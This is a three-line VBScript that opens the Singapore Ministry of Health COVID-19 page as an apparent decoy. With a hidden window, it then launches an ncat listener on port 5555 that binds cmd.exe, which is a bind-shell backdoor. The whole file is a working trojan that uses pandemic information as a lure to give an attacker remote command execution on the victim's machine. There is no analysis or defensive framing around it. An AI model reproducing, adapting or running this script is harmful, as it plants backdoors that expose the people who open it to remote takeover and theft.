set WshShell = CreateObject("wscript.shell")
WshShell.run "www.moh.gov.sg/covid-19"
WshShell.run "cmd.exe /K cd \ & ncat -lvp 5555 -e cmd.exe", 0
